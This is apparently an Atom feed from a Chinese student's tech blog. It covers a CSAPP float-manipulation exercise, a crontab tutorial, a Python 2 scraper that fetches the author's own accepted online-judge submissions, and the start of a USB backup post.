1;        // 向上舍入</div><div class="line">  else if((frac &amp; 0x3ff) == 0x300) rounding = 1;  // 向上舍入</div><div class="line">  frac = (frac &gt;&gt; 9) + rounding; // 计算尾数</div><div class="line"></div><div class="line">  return (sign &lt;&lt; 31) + exp + frac;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="float-twice-Return-bit-level-equivalent-of-expression-2-f-for"><a href="#float-twice-Return-bit-level-equivalent-of-expression-2-f-for" class="headerlink" title="float_twice - Return bit-level equivalent of expression 2*f for"></a>float_twice - Return bit-level equivalent of expression 2*f for</h2><p>目标：返回浮点uf的两倍（以unsigned的形式）<br>方法：对于非规格化的数，uf的两倍等价于尾数左移一位，即小数字段左移移位；对于规格化的数，uf的两倍等价于阶码加一，即阶码字段加一</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">unsigned float_twice(unsigned uf) &#123;</div><div class="line">  unsigned f = uf;</div><div class="line">  if ((f &amp; 0x7F800000) == 0) &#123;                  // 非规格化的</div><div class="line">    f = ((f &amp; 0x007FFFFF) &lt;&lt; 1) | (0x80000000 &amp; f);</div><div class="line">  &#125;</div><div class="line">  else if ((f &amp; 0x7F800000) != 0x7F800000) &#123;    // 规格化的</div><div class="line">    f = f + 0x00800000;</div><div class="line">  &#125;</div><div class="line">  return f;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;bitAnd-x-amp-y-using-only-and&quot;&gt;&lt;a href=&quot;#bitAnd-x-amp-y-using-only-and&quot; class=&quot;headerlink&quot; title=&quot;bitAnd - x&amp;amp;y using only ~ and |&quot;&gt;&lt;/a&gt;bitAnd - x&amp;amp;y using only ~ and |&lt;/h2&gt;&lt;p&gt;目标：不使用&amp;amp;运算符计算按位与运算&lt;br&gt;方法：运用德·摩根定律：非(P 且 Q) = (非 P) 或 (非 Q)&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;int bitAnd(int x, int y) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  return ~((~x) | (~y));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="计算机系统" scheme="http://xzjqx.data/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="C/C++" scheme="http://xzjqx.data/tags/C-C/"/>
    
      <category term="CSAPP" scheme="http://xzjqx.data/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>初次使用crontab工具</title>
    <link href="http://xzjqx.data/2016/04/24/%E5%88%9D%E6%AC%A1%E4%BD%BF%E7%94%A8crontab%E5%B7%A5%E5%85%B7/"/>
    <id>http://xzjqx.data/2016/04/24/初次使用crontab工具/</id>
    <published>2016-04-24T09:22:13.000Z</published>
    <updated>2017-08-21T05:15:48.581Z</updated>
    
    <content type="html"><![CDATA[<!-- Date: 2016-04-23 -->
<p>crontab是linux下的一个定时任务工具</p>
<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">usage:  crontab [-u user] file</div><div class="line">        crontab [-u user] [ -e | -l | -r ]</div><div class="line">                (default operation is replace, per 1003.2)</div><div class="line">        -e      (edit user&apos;s crontab)</div><div class="line">        -l      (list user&apos;s crontab)</div><div class="line">        -r      (delete user&apos;s crontab)</div></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="简单解释"><a href="#简单解释" class="headerlink" title="简单解释"></a>简单解释</h3><p>crontab [-u username] [-l|-e|-r]<br>选项与参数：<br>-u  ：只有 root 才能进行这个任务，亦即帮其他使用者创建/移除 crontab 工作排程；<br>-e  ：编辑 crontab 的工作内容<br>-l  ：查阅 crontab 的工作内容<br>-r  ：移除所有的 crontab 的工作内容，若仅要移除一项，请用 -e 去编辑</p>
<h3 id="特殊符号使用"><a href="#特殊符号使用" class="headerlink" title="特殊符号使用"></a>特殊符号使用</h3><p>* ： 表示任何时刻<br>, ： 表示分割<br>－ ：表示一个段，如第二端里： 1-5，就表示1到5点<br>/n : 表示每个n的单位执行一次，如第二段里，*/1 , 就表示每隔1个小时执行一次命令。也可以写成1-23/1.</p>
<h3 id="一些实例"><a href="#一些实例" class="headerlink" title="一些实例"></a>一些实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">43 21 * * *              21:43 执行</div><div class="line">15 05 * * *              05:15 执行</div><div class="line">0 17 * * *               17:00 执行</div><div class="line">0 17 * * 1               每周一的 17:00 执行</div><div class="line">0,10 17 * * 0,2,3        每周日,周二,周三的 17:00和 17:10 执行</div><div class="line">0-10 17 1 * *            毎月1日从 17:00到7:10 毎隔1分钟 执行</div><div class="line">0 0 1,15 * 1             毎月1日和 15日和 一日的 0:00 执行</div><div class="line">42 4 1 * *               毎月1日的 4:42分 执行</div><div class="line">0 21 * * 1-6             周一到周六 21:00 执行</div><div class="line">0,10,20,30,40,50 * * * *  每隔10分 执行</div><div class="line">*/10 * * * *              每隔10分 执行</div><div class="line">* 1 * * *                 从1:0到1:59 每隔1分钟 执行</div><div class="line">0 1 * * *                 1:00 执行</div><div class="line">0 */1 * * *               毎时0分 每隔1小时 执行</div><div class="line">0 * * * *                 毎时0分 每隔1小时 执行</div><div class="line">2 8-20/3 * * *            8:02,11:02,14:02,17:02,20:02 执行</div><div class="line">30 5 1,15 * *             1日 和 15日的 5:30 执行</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- Date: 2016-04-23 --&gt;
&lt;p&gt;crontab是linux下的一个定时任务工具&lt;/p&gt;
&lt;h2 id=&quot;Usage&quot;&gt;&lt;a href=&quot;#Usage&quot; class=&quot;headerlink&quot; title=&quot;Usage&quot;&gt;&lt;/a&gt;Usage&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;usage:  crontab [-u user] file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        crontab [-u user] [ -e | -l | -r ]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                (default operation is replace, per 1003.2)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        -e      (edit user&amp;apos;s crontab)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        -l      (list user&amp;apos;s crontab)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        -r      (delete user&amp;apos;s crontab)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="linux" scheme="http://xzjqx.data/tags/linux/"/>
    
      <category term="crontab" scheme="http://xzjqx.data/tags/crontab/"/>
    
  </entry>
  
  <entry>
    <title>Python登录学校OJ爬取AC代码</title>
    <link href="http://xzjqx.data/2016/04/13/Python%E7%99%BB%E5%BD%95%E5%AD%A6%E6%A0%A1OJ%E7%88%AC%E5%8F%96AC%E4%BB%A3%E7%A0%81/"/>
    <id>http://xzjqx.data/2016/04/13/Python登录学校OJ爬取AC代码/</id>
    <published>2016-04-13T14:15:51.000Z</published>
    <updated>2017-08-21T05:15:48.569Z</updated>
    
    <content type="html"><![CDATA[<p>最近持续学习python中，真是学到深处越来越爱上这门语言了，她“优雅”、“明确”、“简单”的特性深深的吸引了我。<br>真是太能扯了，屌丝果然只能<del>爱上</del>语言了.<br>我在这介绍一部简单易懂的Python教程——<a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0013747381369301852037f35874be2b85aa318aad57bda000" target="_blank" rel="external">Python2</a>,<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="external">Python3</a></p>
<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>之前用Python爬取了Toj的题目主干——<a href="">简单Python爬虫练习</a>，并以此作为Python爬虫的入门实验，待我Python能力有所长进后，就想到或许可以使用Python把自己之前提交的AC代码全部爬下来，这也许会很有趣。<br>没错，博主就是天津大学的在校本科生~<br><a id="more"></a></p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>首先我们需要分析一下要爬取的网站架构，这是<a href="http://acm.tju.edu.cn/toj/" target="_blank" rel="external">TOJ主页</a></p>
<h2 id="查找AC提交"><a href="#查找AC提交" class="headerlink" title="查找AC提交"></a>查找AC提交</h2><p>Toj是靠Run ID来区分所有的提交的，所以我们想要找到自己的AC代码，只需要把自己的AC提交ID记录下来即可<br>在<a href="http://acm.tju.edu.cn/toj/status.php?accept=1&amp;user=xxx" target="_blank" rel="external">http://acm.tju.edu.cn/toj/status.php?accept=1&amp;user=xxx</a> 上记录了username为xxx的提交人的AC提交，使用浏览器的审查功能可以看到截图：<br><img src="http://7xo385.com1.z0.glb.clouddn.com/UQA30R%7D%5D9~XMMFKTQ%29%5DBJYK.png" alt=""><br>看上图两个方框圈起来的地方是对应的，这里的Run ID就是我们要找的东西</p>
<h2 id="爬取准备"><a href="#爬取准备" class="headerlink" title="爬取准备"></a>爬取准备</h2><p>找完所有的AC提交ID，我们就可以开始爬取对应代码了<br>点击上图中code尺寸的链接就会进入一个密码验证界面——<a href="http://acm.tju.edu.cn/toj/show_open.php?sid=1591405" target="_blank" rel="external">http://acm.tju.edu.cn/toj/show_open.php?sid=1591405</a><br>这里的sid就是你打开的代码对应的Run ID<br>输入密码验证成功后就会进入有AC代码的页面，在审查中打开Network属性可以看到下面的结果：<br><img src="http://7xo385.com1.z0.glb.clouddn.com/@G0W12M~C5~%7D414_LS5%5DQ~8.png" alt=""><br>这里最重要的信息是：</p>
<ul>
<li>Request URL:</li>
<li>user_id:</li>
<li>sid:1591405</li>
<li>passwd:<br>请求的URL为<a href="http://acm.tju.edu.cn/toj/show_code.php，表单提交的数据有user_id,sid,passwd" target="_blank" rel="external">http://acm.tju.edu.cn/toj/show_code.php，表单提交的数据有user_id,sid,passwd</a><br>知道这些我们就可以完成上面的密码验证过程了<br>最后查看该页面的html代码就可以爬下你的AC代码了</li>
</ul>
<h1 id="码代码"><a href="#码代码" class="headerlink" title="码代码"></a>码代码</h1><h2 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h2><p>首先看看我用到的所有模块吧<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> getpass <span class="comment">#实现不回显输入密码</span></div><div class="line"><span class="keyword">import</span> urllib  </div><div class="line"><span class="keyword">import</span> urllib2 <span class="comment">#这两个是爬虫用的经典库</span></div><div class="line"><span class="keyword">import</span> bs4     <span class="comment">#提取并分析HTML内容的工具</span></div><div class="line"><span class="keyword">import</span> os      <span class="comment">#操作系统相关工具</span></div></pre></td></tr></table></figure></p>
<h2 id="获取AC提交ID"><a href="#获取AC提交ID" class="headerlink" title="获取AC提交ID"></a>获取AC提交ID</h2><p>按照上面的准备过程，首先我们要找到自己的AC提交ID：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRunId</span><span class="params">(user_id, sid_url, run_id)</span>:</span></div><div class="line">    request = urllib2.Request(sid_url)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    soup = bs4.BeautifulSoup(response.read(), <span class="string">"lxml"</span>)</div><div class="line">    tr = soup.select(<span class="string">'tr[height="30"]'</span>) <span class="comment">#按照此属性选择标签</span></div><div class="line">    <span class="keyword">if</span> len(tr) &gt; <span class="number">0</span>: <span class="comment">#如果标签数不为0，则继续查找下一页</span></div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> tr:</div><div class="line">            run_id.append(x.get_text()[<span class="number">0</span>:<span class="number">7</span>])</div><div class="line">            y = (int)(x.get_text()[<span class="number">0</span>:<span class="number">7</span>])</div><div class="line">        sid_url = <span class="string">"http://acm.tju.edu.cn/toj/status.php?user=%s&amp;accept=1&amp;start=%d"</span> %(user_id,y<span class="number">-1</span>)</div><div class="line">        getRunId(user_id, sid_url, run_id)</div><div class="line">    <span class="keyword">return</span> run_id</div></pre></td></tr></table></figure></p>
<p>这里用到bs4下的BeautifulSoup工具完成了对HTML文档的解析，从中我们找到了所有的AC提交ID</p>
<h2 id="获取AC代码"><a href="#获取AC代码" class="headerlink" title="获取AC代码"></a>获取AC代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> <span class="string">'Printing All Your AC Codes...'</span></div><div class="line"><span class="keyword">for</span> sid <span class="keyword">in</span> run_id:</div><div class="line">    url = <span class="string">"http://acm.tju.edu.cn/toj/show_code.php"</span></div><div class="line">    values = &#123;</div><div class="line">        <span class="string">"user_id"</span> : user_id,</div><div class="line">        <span class="string">"sid"</span> : sid,</div><div class="line">        <span class="string">"passwd"</span> : passwd</div><div class="line">    &#125;</div><div class="line">    data = urllib.urlencode(values)</div><div class="line">    request = urllib2.Request(url,data)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    soup = bs4.BeautifulSoup(response.read(), <span class="string">"lxml"</span>)</div><div class="line">    pid = soup.select(<span class="string">'a'</span>)[<span class="number">8</span>].get_text()</div><div class="line">    code = soup.select(<span class="string">'pre'</span>)[<span class="number">0</span>].get_text().encode(<span class="string">'utf-8'</span>)</div><div class="line">    fo = open(to_dir + <span class="string">'\\'</span> + pid + <span class="string">u'.cpp'</span>, <span class="string">"wb"</span>)</div><div class="line">    fo.write(code)</div></pre></td></tr></table></figure>
<p>说明一下，这里模拟了登录验证密码的过程，也就是之前提到的表单提交<br>与此同时，我们还把AC代码提取出来并保存在本地了，看看下面的截图你就能明白是如何提取的了<br><img src="http://7xo385.com1.z0.glb.clouddn.com/%29%29X39Y@%7DDCR%5BOMREX%25D~2%7B1.png" alt=""></p>
<h2 id="输入账号密码和代码保存目录"><a href="#输入账号密码和代码保存目录" class="headerlink" title="输入账号密码和代码保存目录"></a>输入账号密码和代码保存目录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> <span class="string">'Please Input Your Username: '</span>,</div><div class="line">user_id = raw_input()</div><div class="line">passwd = getpass.getpass(<span class="string">'Please Input Your Password: '</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">'Please Input Your Target Directory: '</span>,</div><div class="line">to_dir = raw_input()</div><div class="line"></div><div class="line"><span class="comment">#Verify Your Username</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Verifying Your Username...'</span>,</div><div class="line">sid_url = <span class="string">"http://acm.tju.edu.cn/toj/status.php?accept=1&amp;user=%s"</span> % (user_id)</div><div class="line">request = urllib2.Request(sid_url)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line">soup = bs4.BeautifulSoup(response.read(), <span class="string">"lxml"</span>)</div><div class="line">tr = soup.select(<span class="string">'tr[height="30"]'</span>)</div><div class="line"><span class="keyword">if</span> len(tr) == <span class="number">0</span>:</div><div class="line">    <span class="keyword">raise</span> Exception (<span class="string">"No Such User"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'\nDone!'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Finding Your AC Run Id...'</span></div><div class="line">    run_id = getRunId(user_id, sid_url, [])</div><div class="line">    <span class="keyword">print</span> <span class="string">'Done!'</span></div><div class="line"></div><div class="line"><span class="comment">#Verify Your Password</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Verifying Your Password...'</span>,</div><div class="line">url = <span class="string">"http://acm.tju.edu.cn/toj/show_code.php"</span></div><div class="line">sid = tr[<span class="number">0</span>].get_text()[<span class="number">0</span>:<span class="number">7</span>]</div><div class="line">values = &#123;</div><div class="line">    <span class="string">"user_id"</span> : user_id,</div><div class="line">    <span class="string">"sid"</span> : sid,</div><div class="line">    <span class="string">"passwd"</span> : passwd</div><div class="line">&#125;</div><div class="line">data = urllib.urlencode(values)</div><div class="line">request = urllib2.Request(url,data)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line">s = response.read().decode(<span class="string">'utf-8'</span>, <span class="string">'ignore'</span>)</div><div class="line"><span class="keyword">if</span> s.find(<span class="string">"Password Error!"</span>) != <span class="number">-1</span>:</div><div class="line">    <span class="keyword">raise</span> Exception (<span class="string">"Password Error!"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'Done!'</span></div><div class="line"></div><div class="line"><span class="comment">#Verify Your to_dir</span></div><div class="line"><span class="keyword">if</span> os.path.exists(to_dir) <span class="keyword">is</span> <span class="keyword">False</span>:</div><div class="line">    os.mkdir(to_dir)</div></pre></td></tr></table></figure>
<p>这里的过程基本上大家都明白了吧，我只是使用了Python自带的raise语句抛出一个错误，达到验证账号密码是否正确的目的</p>
<h1 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> getpass</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> bs4</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRunId</span><span class="params">(user_id, sid_url, run_id)</span>:</span></div><div class="line">    request = urllib2.Request(sid_url)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    soup = bs4.BeautifulSoup(response.read(), <span class="string">"lxml"</span>)</div><div class="line">    tr = soup.select(<span class="string">'tr[height="30"]'</span>)</div><div class="line">    <span class="keyword">if</span> len(tr) &gt; <span class="number">0</span>:</div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> tr:</div><div class="line">            run_id.append(x.get_text()[<span class="number">0</span>:<span class="number">7</span>])</div><div class="line">            y = (int)(x.get_text()[<span class="number">0</span>:<span class="number">7</span>])</div><div class="line">        sid_url = <span class="string">"http://acm.tju.edu.cn/toj/status.php?user=%s&amp;accept=1&amp;start=%d"</span> %(user_id,y<span class="number">-1</span>)</div><div class="line">        getRunId(user_id, sid_url, run_id)</div><div class="line">    <span class="keyword">return</span> run_id</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'Please Input Your Username: '</span>,</div><div class="line">user_id = raw_input()</div><div class="line">passwd = getpass.getpass(<span class="string">'Please Input Your Password: '</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">'Please Input Your Target Directory: '</span>,</div><div class="line">to_dir = raw_input()</div><div class="line"></div><div class="line"><span class="comment">#Verify Your Username</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Verifying Your Username...'</span>,</div><div class="line">sid_url = <span class="string">"http://acm.tju.edu.cn/toj/status.php?accept=1&amp;user=%s"</span> % (user_id)</div><div class="line">request = urllib2.Request(sid_url)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line">soup = bs4.BeautifulSoup(response.read(), <span class="string">"lxml"</span>)</div><div class="line">tr = soup.select(<span class="string">'tr[height="30"]'</span>)</div><div class="line"><span class="keyword">if</span> len(tr) == <span class="number">0</span>:</div><div class="line">    <span class="keyword">raise</span> Exception (<span class="string">"No Such User"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'\nDone!'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Finding Your AC Run Id...'</span></div><div class="line">    run_id = getRunId(user_id, sid_url, [])</div><div class="line">    <span class="keyword">print</span> <span class="string">'Done!'</span></div><div class="line"></div><div class="line"><span class="comment">#Verify Your Password</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Verifying Your Password...'</span>,</div><div class="line">url = <span class="string">"http://acm.tju.edu.cn/toj/show_code.php"</span></div><div class="line">sid = tr[<span class="number">0</span>].get_text()[<span class="number">0</span>:<span class="number">7</span>]</div><div class="line">values = &#123;</div><div class="line">    <span class="string">"user_id"</span> : user_id,</div><div class="line">    <span class="string">"sid"</span> : sid,</div><div class="line">    <span class="string">"passwd"</span> : passwd</div><div class="line">&#125;</div><div class="line">data = urllib.urlencode(values)</div><div class="line">request = urllib2.Request(url,data)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line">s = response.read().decode(<span class="string">'utf-8'</span>, <span class="string">'ignore'</span>)</div><div class="line"><span class="keyword">if</span> s.find(<span class="string">"Password Error!"</span>) != <span class="number">-1</span>:</div><div class="line">    <span class="keyword">raise</span> Exception (<span class="string">"Password Error!"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'Done!'</span></div><div class="line"></div><div class="line"><span class="comment">#Verify Your to_dir</span></div><div class="line"><span class="keyword">if</span> os.path.exists(to_dir) <span class="keyword">is</span> <span class="keyword">False</span>:</div><div class="line">    os.mkdir(to_dir)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'Printing All Your AC Codes...'</span></div><div class="line"><span class="keyword">for</span> sid <span class="keyword">in</span> run_id:</div><div class="line">    url = <span class="string">"http://acm.tju.edu.cn/toj/show_code.php"</span></div><div class="line">    values = &#123;</div><div class="line">        <span class="string">"user_id"</span> : user_id,</div><div class="line">        <span class="string">"sid"</span> : sid,</div><div class="line">        <span class="string">"passwd"</span> : passwd</div><div class="line">    &#125;</div><div class="line">    data = urllib.urlencode(values)</div><div class="line">    request = urllib2.Request(url,data)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    soup = bs4.BeautifulSoup(response.read(), <span class="string">"lxml"</span>)</div><div class="line">    pid = soup.select(<span class="string">'a'</span>)[<span class="number">8</span>].get_text()</div><div class="line">    code = soup.select(<span class="string">'pre'</span>)[<span class="number">0</span>].get_text().encode(<span class="string">'utf-8'</span>)</div><div class="line">    fo = open(to_dir + <span class="string">'\\'</span> + pid + <span class="string">u'.cpp'</span>, <span class="string">"wb"</span>)</div><div class="line">    fo.write(code)</div></pre></td></tr></table></figure>
<h2 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h2><p>Follow 我的<a href="https://github.com/xzjqx/python-study" target="_blank" rel="external">Python学习项目</a>吧，大家一起进步</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近持续学习python中，真是学到深处越来越爱上这门语言了，她“优雅”、“明确”、“简单”的特性深深的吸引了我。&lt;br&gt;真是太能扯了，屌丝果然只能&lt;del&gt;爱上&lt;/del&gt;语言了.&lt;br&gt;我在这介绍一部简单易懂的Python教程——&lt;a href=&quot;http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0013747381369301852037f35874be2b85aa318aad57bda000&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Python2&lt;/a&gt;,&lt;a href=&quot;http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Python3&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;之前用Python爬取了Toj的题目主干——&lt;a href=&quot;&quot;&gt;简单Python爬虫练习&lt;/a&gt;，并以此作为Python爬虫的入门实验，待我Python能力有所长进后，就想到或许可以使用Python把自己之前提交的AC代码全部爬下来，这也许会很有趣。&lt;br&gt;没错，博主就是天津大学的在校本科生~&lt;br&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="http://xzjqx.data/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://xzjqx.data/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>U盘备份的Python小程序</title>
    <link href="http://xzjqx.data/2016/04/07/Python%E5%AE%9E%E7%8E%B0U%E7%9B%98%E5%A4%87%E4%BB%BD%E5%8A%9F%E8%83%BD/"/>
    <id>http://xzjqx.data/2016/04/07/Python实现U盘备份功能/</id>
    <published>2016-04-06T16:52:16.000Z</published>
    <updated>2017-08-21T05:15:48.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>前几天去学校机房做实验，U盘果然又被机房电脑玷污了，又只能格式化了（衰~）<br>思考解决办法，想着如果每当电脑插入U盘，就自动备份U盘里的文件就好了</p>
<h1 id="行动"><a href="#行动" class="headerlink" title="行动"></a>行动</h1><p>想到就做吧，正好这几天在学习Python，那就用python来实现这个小脚本吧<br><a id="more"></a></p>
